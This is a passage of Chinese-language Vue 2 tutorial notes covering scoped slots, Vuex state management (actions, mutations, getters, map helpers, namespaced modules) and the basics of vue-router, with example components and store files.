       games: ['红色警戒'，'穿越火线'，'劲舞团'，超级玛丽']}
},
</script>
```

![image-20231002164506908](D:\typora_photo\image-20231002164506908.png)

![image-20231002164451454](D:\typora_photo\image-20231002164451454.png)

![image-20231002164600693](D:\typora_photo\image-20231002164600693.png)

![image-20231002164607378](D:\typora_photo\image-20231002164607378.png)

``` vue
//Category.vue
<template>
  <div class="category">
    <h3>{{title}}分类</h3>
    <slot :games="games" msg="hello">我是默认的内容</slot>
  </div>
</template>
<script>
export default {
    name: 'Category',
  props: ['title'],
  data() {
    return {
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"]
    };
  }
}
</script>
<style scoped>
.category{
    background-color: skyblue;
    width: 200px;
    height: 300px;  
}
h3{
    text-align: center;
    background-color: orange;
}
</style>
```

```vue
//App.vue
<template>
  <div class="container">
    <Category title="游戏">
      <template scope="atguigu">
        <!-- {{ atguigu.games }} -->
        <ul>
          <li v-for="(item, index) in atguigu.games" :key="index">{{ item }}</li>
        </ul>
      </template>
    </Category>
    <Category title="游戏">
      <template scope={games}>//解构赋值
      <ol>
        <li style="color:red" v-for="(item, index) in games" :key="index">{{ item }}</li>
      </ol>
      <h4> {{atguigu.msg}}</h4>
    </template>
    </Category>
    <Category title="游戏">
      <template slot-scope={games}>
      <h4 v-for="(item, index) in games" :key="index">{{ item }}</h4>
    </template>
    </Category>
  </div>
</template>
  <script>
import Category from "./components/Category.vue";
export default {
  name: "App",
  components: {
    Category,
  },
};
</script>
  <style>
.container,
.foot {
  display: flex;
  justify-content: space-around;
}
video {
  width: 100%;
}
h4 {
  text-align: center;
}
</style>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus=this
    },
})
```

![image-20231002165854463](D:\typora_photo\image-20231002165854463.png)

## 五、Vuex

### 5.1 理解vuex

#### **5.1.1 vuex 是什么**

1. 概念：**专门在 Vue 中实现集中式状态（数据）管理的一个 Vue 插件**，对 vue 应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

2. Github 地址: https://github.com/vuejs/vuex

   

![image-20231002195531758](D:\typora_photo\image-20231002195531758.png)

![image-20231002195857382](D:\typora_photo\image-20231002195857382.png)



#### **5.1.2 什么时候使用 Vuex**

1. 多个组件依赖于同一状态

2. 来自不同组件的行为需要变更同一状态

#### 5.1.3 求和案例 纯vue

```vue
//Count.js
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>
<script>
export default {
  name: "Count",
  data() {
    return {
      n: 1, //用户选择的数字
      sum: 0, //当前的和
    };
  },
  methods: {
    increment() {
      this.sum += this.n;
    },
    decrement() {
      this.sum -= this.n;
    },
    incrementOdd() {
      if (this.sum % 2) {
        this.sum += this.n;
      }
    },
    incrementWait() {
      setTimeout(() => {
        this.sum += this.n;
      }, 1000);
    },
  },
};
</script>
<style scoped>
button {
  margin-left: 5px;
}
</style>
```

```vue
//App.vue
<template>
  <div>
    <Count/>
  </div>
</template>    
    <script>
import Count from "./components/Count.vue";
export default {
  name: "App",
  components: {
    Count,
  },
};
</script>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;

new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus=this
    },
})
```

![v](D:\typora_photo\image-20231002203045181.png)

#### **5.1.4 Vuex 工作原理图**

![image-20231002210926307](D:\typora_photo\image-20231002210926307.png)

### 5.2 搭建vuex环境

   1.安装vuex模块：npm  i  vuex@3

![image-20231002211223377](D:\typora_photo\image-20231002211223377.png)

2. 创建核心store文件index.js：

```js
//该文件用于创建vuex中最核心的store
import Vue from 'vue'
import Vuex from 'vuex'
//使用插件
Vue.use(Vuex)
//准备actions：用于响应组件中的动作
const actions = {},
//准备mutations：用于操作数据(state)
const mutations = {}
//准备state：用于存储数据
const state = {}

//创建并导出store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

3.在main.js中创建vm时同时引入store配置项

```js
import Vue from 'vue'
import App from './App.vue'
//引入store
import store from './store'

Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    store,
    beforeCreate() {
        Vue.prototype.$bus=this
    }
})
```

4.基本使用

（1）初始化数据、配置actions、配置mutations，操作文件index.js

```js
//该文件用于创建vuex中最核心的store
import { setTimeout } from 'core-js';
import Vue from 'vue'
import Vuex from 'vuex'
//使用插件
Vue.use(Vuex)
//准备actions：用于响应组件中的动作
const actions = {
    //响应组件中加的动作
    jia (context,value) { //context是小型版的store，上下文(包含可能将要用到的方法)   
         console.log('actions中的jia被调用了', context, value);//value是要加上的值
         context.commit('JIA',value)
    }
}
//准备mutations：用于操作数据(state)
const mutations = {
    //执行加
    JIA(state,value) {  //state为状态对象,value为要加上的值
        console.log('mutations中的JIA被调用了', state, value);
        state.sum+=value
    }
}
//初始化数据
//准备state：用于存储数据
const state = {
    sum: 0 //当前的和
}
//创建并导出store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

（2）组件中读取vuex中的数据：**$store.state.sum**
（3）组件中修改vuex中的数据：

```
$store.dispatch('action中的方法名',数据)  或   $store.commit('mutations中的方法名',数据)
```


备注：若没有网络请求或其他业务逻辑，**组件中也可以越过actions，即不写dispatch，直接编写commit**

**求和案例——vuex书写**

```vue
//Count.vue
<template>
  <div>
    <h1>当前求和为：{{ $store.state.sum }}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>
<script>
export default {
  name: "Count",
  data() {
    return {
      n: 1 //用户选择的数字
    };
  },
  methods: {
    increment() {
      this.$store.commit('JIA', this.n)//如果没有其他业务逻辑，可以不走dispatch,直接走commit
    },
    decrement() {
      this.$store.commit('JIAN', this.n)
    },
    incrementOdd() {
      // if(this.$store.state.sum%2){
      //   this.$store.dispatch('jia',this.n)
      // }
      this.$store.dispatch('jiaOdd', this.n)
    },
    incrementWait() {
      //   setTimeout(() => {
      //     this.$store.dispatch('jia',this.n)
      //   }, 1000);
      // },
      this.$store.dispatch('jiaWait', this.n)
    },
  }
};
</script>
<style scoped>
button {
  margin-left: 5px;
}
</style>
```

```js
//index.js
//该文件用于创建vuex中最核心的store
import { setTimeout } from 'core-js';
import Vue from 'vue'
import Vuex from 'vuex'
//使用插件
Vue.use(Vuex)
//准备actions：用于响应组件中的动作
const actions = {
    // jia (context,value) { //context是小型版的store，上下文(包含可能将要用到的方法)   
    //     console.log('actions中的jia被调用了', context, value);//value是要加上的值
    //     context.commit('JIA',value)
    // },
    // jian (context,value) {   
    //     console.log('actions中的jian被调用了', context, value);
    //     context.commit('JIAN',value)
    // },
    jiaOdd (context,value) { 
        console.log('actions中的jiaOdd被调用了', context, value);
        if (context.state.sum % 2) { //业务逻辑
              context.commit('JIA',value) 
        }
    },
    jiaWait (context,value) { //context是小型版的store，上下文(包含可能将要用到的方法)   
        console.log('actions中的jiaWait被调用了', context, value);//value是要加上的值
        setTimeout(() => {
             context.commit('JIA', value)
        }, 1000);
    },
}
//准备mutations：用于操作数据(state)
const mutations = {
    JIA(state,value) {  //state为状态对象,value为要加上的值
        console.log('mutations中的JIA被调用了', state, value);
        state.sum+=value
    },
    JIAN(state,value) {
        console.log('mutations中的JIAN被调用了', state, value);
        state.sum-=value
    }
}
//准备state：用于存储数据
const state = {
    sum: 0 //当前的和
}
//创建并导出store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//引入store
import store from './store'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    store,
    beforeCreate() {
        Vue.prototype.$bus=this
    }
})
```

```vue
//App.vue
<template>
  <div>
    <Count />
  </div>
</template>
<script>
import Count from "./components/Count.vue";
export default {
  name: "App",
  components: {
    Count,
  },
  mounted() {
    console.log(this);
  },
};
</script>
```

![image-20231003103135505](D:\typora_photo\image-20231003103135505.png)

### 5.3 **vuex 核心概念和 API**

store管理actions、mutations、state

#### **5.3.1 state**

1. vuex 管理的状态对象

2. 它应该是唯一的

3. 示例代码：

   ![image-20231004095030016](D:\typora_photo\image-20231004095030016.png)

#### **5.3.2 actions**

1. 值为一个对象，包含多个响应用户动作的回调函数

2. 通过 commit( )来触发 mutation 中函数的调用, 间接更新 state
3.  如何触发 actions 中的回调？

​        **在组件中使用: $store.dispatch(对应的action 回调名) 触发**

4. **可以包含异步代码（定时器, ajax 等等）**

5. 示例代码：

   ![image-20231004095211489](D:\typora_photo\image-20231004095211489.png)

#### **5.3.3 mutations**

1. 值是一个对象，包含多个直接更新 state 的方法

2. 谁能调用 mutations 中的方法？如何调用？

​       **在 action 中使用：commit('对应的 mutations方法名') 触发**

3. mutations 中方法的特点：**不能写异步代码、只能单纯的操作 state**

4. 示例代码

![image-20231004095311849](D:\typora_photo\image-20231004095311849.png)

#### 5.3.4  getters的使用

1.概念：**当state中的数据需要经过加工后再使用时，可以使用getters加工**。
2.在store.js中追加getters配置

```js
const getters = {
    bigSum(state){
        return state.sum*10
    }
}
//创建并暴露store
export default new Vuex.Store({
    ...... getters
}
```

3.组件中读取数据： $store.getters.bigSum

![image-20231003114244745](D:\typora_photo\image-20231003114244745.png)

#### 5.3.5 四个map方法的使用

语法回顾：

```js
<script>
   let obj1={x:100,y:200}
   let obj2={
        a:1,
        ...obj1,//相当于将obj1中的key、value放入obj2中
        b:2
   }
   console.log(obj2);
</script>
```

![image-20231003115747729](D:\typora_photo\image-20231003115747729.png)

**1.mapState方法:用于帮助我们映射state中的数据为计算属性**

```js
computed:{
    //借助mapState生成计算属性:sum、school、subject(对象写法）
    ...mapState({sum:'sum',school:'school',subject:'subject'}),
    //借助mapState生成计算属性:sum、school、subject(数组写法)
    ...mapState(['sum','school','subject']),},
```

（1）对象写法

```vue
//Count.vue
<template>
  <div>
    <h1>当前求和为：{{ he }}</h1>
    <h1>当前求和放大10倍为：{{ $store.getters.bigSum }}</h1>
    <h3>我在{{xuexiao}}，学习{{ neirong}}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>
<script>
import {mapState} from 'vuex'
export default {
  name: "Count",
  data() {
    return {
      n: 1 //用户选择的数字 
    };
  },
  mounted() {
   console.log('Count',this.$store); 
  },
  computed:{
    //借助mapState生成计算属性，从state中读取数据（对象写法） mapState返回是一个对象
    ...mapState({he:'sum',xuexiao:'school',neirong:'subject'})
  },
  methods: {
    increment() {
      this.$store.commit('JIA', this.n)//如果没有其他业务逻辑，可以不走dispatch,直接走commit
    },
    decrement() {
      this.$store.commit('JIAN', this.n)
    },
    incrementOdd() {
      this.$store.dispatch('jiaOdd', this.n)
    },
    incrementWait() {
      this.$store.dispatch('jiaWait', this.n)
    },
  }
};
</script>

<style scoped>
button {
  margin-left: 5px;
}
</style>
```

（2）数组写法

```vue
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为：{{ bigSum }}</h1>
    <h3>我在{{ school }}，学习{{ subject }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>
<script>
import { mapState, mapGetters } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      n: 1, //用户选择的数字
    };
  },
  mounted() {
    console.log("Count", this.$store);
  },
  computed: {
    //程序员自己写的计算属性
    /*sum() {
    return this.$store.state.sum
      },
      school() {
        return this.$store.state.school
      },
      subject() {
        return this.$store.state.subject
      }
        bigSum() {
      return this.$store.getters.bigSum
    }*/

    //借助mapState生成计算属性，从state中读取数据（对象写法） mapState返回是一个对象
    // ...mapState({he:'sum',xuexiao:'school',neirong:'前端'})
    //借助mapState生成计算属性，从state中读取数据（数组写法）
    ...mapState(["sum", "school", "subject"]),

    //借助mapGetters生成计算属性，从getters中读取数据(对象/数组写法)
    // ...mapGetters({ bigSum: "bigSum" })
    ...mapGetters(["bigSum"]),
  },
  methods: {
    increment() {
      this.$store.commit("JIA", this.n); 
    },
    decrement() {
      this.$store.commit("JIAN", this.n);
    },
    incrementOdd() {
      this.$store.dispatch("jiaOdd", this.n);
    },
    incrementWait() {
      this.$store.dispatch("jiaWait", this.n);
    },
  },
};
</script>
<style scoped>
button {
  margin-left: 5px;
}
</style>
```

![image-20231003141316316](D:\typora_photo\image-20231003141316316.png)

**2.mapGetters方法:用于帮助我们映射getters中的数据为计算属性**

```js
computed:{
//借助mapGetters生成计算属性:bigsum(对象写法)
    ...mapGetters({bigSum:'bigSum'}),
//借助mapGetters生成计算属性:bigSum(数组写法)
   ...mapGetters(['bigSum'])
}
```

**3.mapActions方法:用于帮助我们生成与actions对话的方法，即:包含$store.dispatch(xxx)的函数**

```js
methods:{
//靠mapActions生成:incrementOdd、incrementWait(对象形式)
...mapActions({increment0dd:'jia0dd',incrementWait:'jiaWait'})
//靠mapActions生成:incrementOdd、incrementWait(数组形式)
    ...mapActions(['jia0dd','jiaWait'])
}
```

**4.mapMutations方法:用于帮助我们生成与mutations对话的方法，即:包含$store.commit(xxx)的函数**

```js
methods:{
//靠mapActions生成:increment、decrement(对象形式)
    ...mapMutations({increment:'JIA',decrement:'JIAN'}),
//靠mapMutations生成:JIA、JIAN(对象形式)
    ...mapMutations(['JIA','JIAN']),
```

**备注:mapActions与mapMutations使用时，若需要传递参数需要:在模板中绑定事件时传递好参数，否则参数是事件对象event**

#### 5.3.6 完整的vuex实现的求和案例

```vue
//Count.vue
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为：{{ bigSum }}</h1>
    <h3>我在{{ school }}，学习{{ subject }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <!-- <button @click="JIA(n)">+</button>
    <button @click="JIAN(n)">-</button> -->
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>
<script>
import { mapState, mapGetters, mapMutations,mapActions } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      n: 1, //用户选择的数字
    };
  },
  mounted() {
    console.log("Count", this.$store);
  },
  computed: {
    ...mapState(["sum", "school", "subject"]),
    ...mapGetters(["bigSum"]),
  },
  methods: {
     ...mapMutations({increment:'JIA',decrement:'JIAN'}),//需要在定义方法时传入方法用到的值
    ...mapActions({ incrementOdd: 'jiaOdd', incrementWait: 'jiaWait' })
  },
};
</script>
<style scoped>
button {
  margin-left: 5px;
}
</style>
```

```vue
//App.vue
<template>
  <div>
    <Count />
  </div>
</template>
    <script>
import Count from "./components/Count.vue";
export default {
  name: "App",
  components: {
    Count,
  },
  mounted() {
    console.log(this);
  },
};
</script>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//引入store
import store from './store'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    store,
    beforeCreate() {
        Vue.prototype.$bus=this
    }
})
```

```js
//index.js
//该文件用于创建vuex中最核心的store
import { setTimeout } from 'core-js';
import Vue from 'vue'
import Vuex from 'vuex'
//使用插件
Vue.use(Vuex)
//准备actions：用于响应组件中的动作
const actions = {
    jiaOdd (context,value) { 
        console.log('actions中的jiaOdd被调用了', context, value);
        if (context.state.sum % 2) { //业务逻辑
              context.commit('JIA',value) 
        }
    },
    jiaWait (context,value) { //context是小型版的store，上下文(包含可能将要用到的方法)   
        console.log('actions中的jiaWait被调用了', context, value);//value是要加上的值
        setTimeout(() => {
             context.commit('JIA', value)
        }, 1000);
    },
}
//准备mutations：用于操作数据(state)
const mutations = {
    JIA(state,value) {  //state为状态对象,value为要加上的值
        console.log('mutations中的JIA被调用了', state, value);
        state.sum+=value
    },
    JIAN(state,value) {
        console.log('mutations中的JIAN被调用了', state, value);
        state.sum-=value
    }
}
//准备state：用于存储数据
const state = {
    sum: 0,//当前的和
    school: '尚硅谷',
    subject:'前端'
}
//准备getters：用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum*10
    }
}
//创建并导出store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

#### 5.3.7 多组件共享数据

示例：实现Count组件与Person组件之间的数据共享

```vue
//Count.vue
<template>
  <div>
    <h2>当前求和为：{{ sum }}</h2>
    <h2>当前求和放大10倍为：{{ bigSum }}</h2>
    <h3>我在{{ school }}，学习{{ subject }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <!-- <button @click="JIA(n)">+</button>
    <button @click="JIAN(n)">-</button> -->
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
    <h4 style="color:red">person组件的总人数是{{ personList.length }}</h4>
  </div>
</template>
<script>
import { mapState, mapGetters, mapMutations,mapActions } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      n: 1, //用户选择的数字
    };
  },
  mounted() {
    console.log("Count", this.$store);
  },
  computed: {
    ...mapState(["sum", "school", "subject","personList"]),
    ...mapGetters(["bigSum"]),
  },
  methods: {
    //借助mapMutations生成对应的方法，方法中调用commit去联系mutations(对象写法)
     ...mapMutations({increment:'JIA',decrement:'JIAN'}),//需要在定义方法时传入方法用到的值
  
    //借助mapActions生成对应的方法，方法中调用dispatch去联系mutations(对象/数组写法)
    ...mapActions({ incrementOdd: 'jiaOdd', incrementWait: 'jiaWait' })
  },
};
</script>
<style scoped>
button {
  margin-left: 5px;
}
</style>
```

```vue
//Person.vue
<template>
  <div>
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="name">
    <button @click="add">添加</button>
    <ul>
        <li v-for="p in personList" :key="p.id">{{ p.name }}</li>
    </ul>
    <h4 style="color:red">count组件求和为{{ sum }}</h4>
  </div>
</template>
<script>
import { mapState } from 'vuex'
import { nanoid } from 'nanoid'
export default {
    name: 'Person',
    data() {
        return {
            name:''
        }
    },
    computed: {
        ...mapState(['personList','sum'])
    },
    methods: {
        add() {
            const personobj = { id: nanoid(), name: this.name }
            this.$store.commit('ADD_PERSON', personobj)
            this.name=''
        }
    }
}
</script>
```

```vue
//App.vue
<template>
  <div>
    <Count />
    <hr/>
    <Person/>
  </div>
</template>
    <script>
import Count from "./components/Count.vue";
import Person from "./components/Person.vue"
export default {
  name: "App",
  components: {
    Count,Person
  },
  mounted() {
    console.log(this);
  },
};
</script>
```

```js
//index.js
//该文件用于创建vuex中最核心的store
import { setTimeout } from 'core-js';
import Vue from 'vue'
import Vuex from 'vuex'
//使用插件
Vue.use(Vuex)
//准备actions：用于响应组件中的动作
const actions = {
    jiaOdd (context,value) { 
        console.log('actions中的jiaOdd被调用了', context, value);
        if (context.state.sum % 2) { //业务逻辑
              context.commit('JIA',value) 
        }
    },
    jiaWait (context,value) { //context是小型版的store，上下文(包含可能将要用到的方法)   
        console.log('actions中的jiaWait被调用了', context, value);//value是要加上的值
        setTimeout(() => {
             context.commit('JIA', value)
        }, 1000);
    },
}
//准备mutations：用于操作数据(state)
const mutations = {
    JIA(state,value) {  //state为状态对象,value为要加上的值
        console.log('mutations中的JIA被调用了', state, value);
        state.sum+=value
    },
    JIAN(state,value) {
        console.log('mutations中的JIAN被调用了', state, value);
        state.sum-=value
    },
    ADD_PERSON(state, personobj) {
        console.log('mutations中的 ADD_PERSON被调用了');
        state.personList.unshift(personobj)
    }
}
//准备state：用于存储数据
const state = {
    sum: 0,//当前的和
    school: '尚硅谷',
    subject: '前端',
    personList: [
        {id:'001',name:"张三"}
    ]
}
//准备getters：用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum*10
    }
}
//创建并导出store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//引入store
import store from './store'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    store,
    beforeCreate() {
        Vue.prototype.$bus=this
    }
})
```

![image-20231003152329386](D:\typora_photo\image-20231003152329386.png)

#### 5.3.8 vuex模块化+命名空间

1.目的：**让代码更好维护，让多种数据分类更加明确。**

2.修改store.js

```js
const countAbout ={
namespaced:true,//开启命名空间 state:{x:1},
mutations: {... }, 
actions:{ ... }, 
getters: {
    bigSum(state){
        return state,sum *10
    }
}

const personAbout ={
namespaced:true,//开启命名空间 state:{... },
mutations:{...}, 
actions: {...}
         }
const store = new Vuex.Store({ 
          modules: { 
          countAbout, personAbout
         }
  })
```

3.开启命名空间后，组件中读取state数据:

```js
//方式一，自己直接读取
this.$store.state.personAbout.list
//方式二:借助mapState读取:
...mapState('countAbout',['sum','school','subject']),
```

4.开启命名空间后，组件中读取getters数据:

```js
//方式一，自己直接读取
this.$store.getters['personAbout/firstPersonName']
//方式二:借助mapGetters读取。
...mapGetters('countAbout',['bigSum'])
```

5.开启命名空间后，组件中调用dispatch

```js
//方式一，自己直接dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//方式二:借助mapActions:
...mapActions('countAbout',{increment0dd:'jia0dd',incrementWait:'jiaWait'})
```

6.开启命名空间后，组件中调用commit

```js
//方式一:自己直接commit
this.$store.commit('personAbout/ADD_PERSON',person)
//方式二:借助mapMutations
...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN')),
```

$store中getters的存储方式：

![image-20231003192223332](D:\typora_photo\image-20231003192223332.png)

**示例：vuex模块化开发**

```vue
//Count.vue
<template>
  <div>
    <h2>当前求和为：{{ sum }}</h2>
    <h2>当前求和放大10倍为：{{ bigSum }}</h2>
    <h3>我在{{ school }}，学习{{ subject }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <!-- <button @click="JIA(n)">+</button>
    <button @click="JIAN(n)">-</button> -->
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
    <h4 style="color:red">person组件的总人数是{{ personList.length }}</h4>
  </div>
</template>
<script>
import { mapState, mapGetters, mapMutations,mapActions } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      n: 1, //用户选择的数字
    };
  },
  mounted() {
    console.log("Count", this.$store);
  },
  computed: {
    ...mapState('countAbout',["sum", "school", "subject"]),
    ...mapState('personAbout',["personList"]),
    ...mapGetters('countAbout',["bigSum"]),
  },
  methods: {
     ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
    ...mapActions('countAbout',{ incrementOdd: 'jiaOdd', incrementWait: 'jiaWait' })
  },
};
</script>
<style scoped>
button {
  margin-left: 5px;
}
</style>
```

```vue
//Person.vue
<template>
  <div>
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="name">
    <button @click="add">添加</button>
    <button @click="addPersonWang">添加一个姓王的人</button>
    <button @click="addPersonServer">添加一个来自服务器的姓名</button>
    <ul>
        <li v-for="p in personList" :key="p.id">{{ p.name }}</li>
    </ul>
    <h4 style="color:red">count组件求和为{{ sum }}</h4>
    <h4>列表中第一个人的名字是：{{ firstPersonName }}</h4>
  </div>
</template>
<script>
import { mapState } from 'vuex'
import { nanoid } from 'nanoid'
export default {
    name: 'Person',
    data() {
        return {
            name:''
        }
    },
    computed: {
        personList() {
        return this.$store.state.personAbout.personList
        },
        sum() {
        return this.$store.state.countAbout.sum
        },
        firstPersonName() {
            return this.$store.getters['personAbout/firstPersonName']
        }
    },
    methods: {
        add() {
            const personobj = { id: nanoid(), name: this.name }
            this.$store.commit('personAbout/ADD_PERSON', personobj)
            this.name=''
        },
        addPersonWang() {
            const personobj = { id: nanoid(), name: this.name }
            this.$store.dispatch('personAbout/addPersonWang', personobj)
            this.name=''
        },
        addPersonServer() {
            this.$store.dispatch('personAbout/addPersonServer')
        }
    }
}
</script>
```

```vue 
//App.vue
<template>
  <div>
    <Count />
    <hr/>
    <Person/>
  </div>
</template> 
<script>
import Count from "./components/Count.vue";
import Person from "./components/Person.vue"
export default {
  name: "App",
  components: {
    Count,Person
  },
  mounted() {
    console.log(this.$store);
  },
};
</script>
```

```js
//count.js
export default {
    namespaced:true,//识别分类名
    actions: {
        jiaOdd(context, value) {
            console.log('actions中的jiaOdd被调用了', context, value);
            if (context.state.sum % 2) { //业务逻辑
                context.commit('JIA', value)
            }
        },
        jiaWait(context, value) { //context是小型版的store，上下文(包含可能将要用到的方法)   
            console.log('actions中的jiaWait被调用了', context, value);//value是要加上的值
            setTimeout(() => {
                context.commit('JIA', value)
            }, 1000);
        }
    },
    mutations: {
        JIA(state, value) {  //state为状态对象,value为要加上的值
            console.log('mutations中的JIA被调用了', state, value);
            state.sum += value
        },
        JIAN(state, value) {
            console.log('mutations中的JIAN被调用了', state, value);
            state.sum -= value
        }
    },
    state: {
        sum: 0,//当前的和
        school: '尚硅谷',
        subject: '前端',
    },
    getters: {
        bigSum(state) {
            return state.sum * 10
        }
    }
}
```

```js
//person.js
import axios from 'axios'
import { nanoid } from 'nanoid'
export default {
    namespaced:true,
    actions: {
        addPersonWang(context,value) {
            if (value.name.indexOf('王') === 0) {
                context.commit('ADD_PERSON',value)
            }else{
                alert('必须姓王的人才能添加')
            }
        },
        addPersonServer(context) {
            axios.get('http://localhost:8080/atguigu/student').then(
                response => {
                    context.commit('ADD_PERSON',{id:nanoid(),name:response.data[0].stu})
                    // console.log(response.data[0].stu);
                },
                error => {
                    alert(error.message);
                }
            )
        }
    },
    mutations: {
        ADD_PERSON(state, personobj) {
            console.log('mutations中的 ADD_PERSON被调用了');
            state.personList.unshift(personobj)
        }
    },
    state: {
        personList: [
            { id: '001', name: "张三" }
        ]
    },
    getters: {
        firstPersonName(state) {
            return state.personList[0].name
        }
    }
}
```

```js
//index.js
//该文件用于创建vuex中最核心的store
import { setTimeout } from 'core-js';
import Vue from 'vue'
import Vuex from 'vuex'
import CountOptions from './count'
import PersonOptions from './person'
//使用插件
Vue.use(Vuex)
//创建并导出store
export default new Vuex.Store({
    modules: {
        countAbout: CountOptions,
        personAbout:PersonOptions
   }
})
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//引入store
import store from './store'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    store,
    beforeCreate() {
        Vue.prototype.$bus=this
    }
})
```

![image-20231004092547949](D:\typora_photo\image-20231004092547949.png)

## 六、路由

### **6.1 相关理解**

#### **6.1.1 vue-router 的理解**

vue 的一个插件库，专门用来实现 SPA 应用

#### **6.1.2 对 SPA 应用的理解**

1. 单页 Web 应用（single page web application，SPA）。

2. 整个应用只有**一个完整的页面**。

3. 点击页面中的导航链接**不会刷新**页面，只会做页面的**局部更新。**

4. 数据需要通过 ajax 请求获取。

![image-20231004100608470](D:\typora_photo\image-20231004100608470.png)

### 6.2  路由的理解

#### **路由的理解**

![image-20231004100041880](D:\typora_photo\image-20231004100041880.png)

**1. 什么是路由?**

1. **一个路由就是一组映射关系（key - value）**。

2. key 为路径, value 可能是 function 或 component。

**2. 路由分类**

1. 后端路由：

（1）理解：**value 是 function, 用于处理客户端提交的请求**。

（2）工作过程：服务器接收到一个请求时, 根据**请求路径**找到匹配的**函数**来处理请求, 返回响应数据。

2. 前端路由：

（1） 理解：**value 是 component，用于展示页面内容**。

（2）工作过程：当浏览器的路径改变时, 对应的组件就会显示。

### 6.3 基本路由

#### 6.3.1 配置路由步骤

1.安装vue-router ,命令  npm  i   vue-router@3
2.应用插件  Vue.use(VueRouter)
3.编写 router 配置项
4.实现切换

```js
<router-link></router-link>会被替换成<a></a>
active-class可配置高亮样式
```

5.指定展示位置

```js
<!-- 指定路由组件的呈现位置 -->
<router-view></router-view>
```

示例：

```vue
//  /pages/About.vue
<template>
  <div>
    <h2>我是about内容</h2>
  </div>
</template>
<script>
export default {
  name: "About",
//  beforeDestroy() {
//   console.log('About组件即将被销毁');
//   },
 mounted() {
   console.log('About组件挂载完毕了', this);
   window.aboutRoute = this.$route
   window.aboutRouter=this.$router
 },
};
</script>
<style scoped>
button {
  margin-left: 5px;
}
</style>
```

```vue
//  /pages/Home.vue
<template>
  <div>
    <h2>我是home内容</h2>
  </div>
</template>
<script>
export default {
    name: 'Home',
  //   beforeDestroy() {
  // console.log('Home组件即将被销毁');
  // },
 mounted() {
   console.log('Home组件挂载完毕了', this);
   window.homeRoute = this.$route
   window.homeRouter=this.$router
 
 },
}
</script>
```

```vue
//  /components/Banner.vue
<template>
